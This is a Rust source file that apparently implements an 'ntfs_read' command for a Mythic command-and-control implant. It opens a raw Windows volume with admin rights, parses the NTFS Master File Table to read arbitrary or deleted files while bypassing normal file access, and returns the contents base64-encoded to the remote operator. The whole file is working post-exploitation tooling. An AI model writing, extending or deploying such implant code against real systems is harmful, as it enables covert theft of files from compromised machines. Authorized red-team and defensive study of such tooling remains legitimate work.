use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::error::Error;
use std::sync::mpsc;

#[derive(Deserialize)]
struct NtfsReadArgs {
    action: String,
    #[serde(default = "default_volume")]
    volume: String,
    directory: Option<String>,
    filename: Option<String>,
}

fn default_volume() -> String { "\\\\.\\C:".to_string() }

#[cfg(target_os = "windows")]
pub fn ntfs_read(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: NtfsReadArgs = serde_json::from_str(&task.parameters)?;

    unsafe {
        if !mftool_parser::set_target(&args.volume) {
            tx.send(mythic_error!(task.id, format!("Failed to open volume {}. Requires admin.", args.volume)))?;
            return Ok(());
        }

        match args.action.as_str() {
            "read_file" => {
                let dir = args.directory.unwrap_or_else(|| "\\".to_string());
                let name = match args.filename {
                    Some(n) => n,
                    None => {
                        tx.send(mythic_error!(task.id, "filename required for read_file action"))?;
                        return Ok(());
                    }
                };
                match mftool_parser::read_file_from_mft(&dir, &name) {
                    Some(data) => {
                        use base64::{Engine as _, engine::general_purpose};
                        let b64 = general_purpose::STANDARD.encode(&data);
                        let preview = if b64.len() > 8000 { &b64[..8000] } else { &b64 };
                        tx.send(mythic_success!(task.id, format!("Read {} bytes from {}\\{}\n\nBase64 (first 8KB):\n{}", data.len(), dir, name, preview)))?;
                    }
                    None => {
                        tx.send(mythic_error!(task.id, format!("File not found: {}\\{}", dir, name)))?;
                    }
                }
            }
            "list_dir" => {
                let dir = args.directory.unwrap_or_else(|| "\\".to_string());
                match mftool_parser::list_files_from_directory(&dir) {
                    Some(entries) => {
                        let mut out = format!("Directory: {}\n\n", dir);
                        for (_id, entry) in &entries {
                            out.push_str(&format!("  {}\n", entry.filename));
                        }
                        tx.send(mythic_success!(task.id, out))?;
                    }
                    None => {
                        tx.send(mythic_error!(task.id, format!("Directory not found: {}", dir)))?;
                    }
                }
            }
            "show_deleted" => {
                mftool_parser::show_hidden_entries();
                tx.send(mythic_success!(task.id, "Deleted file entries displayed in console"))?;
            }
            _ => {
                tx.send(mythic_error!(task.id, "Unknown action. Use: read_file, list_dir, show_deleted"))?;
            }
        }
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn ntfs_read(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "ntfs_read requires Windows"))?;
    Ok(())
}
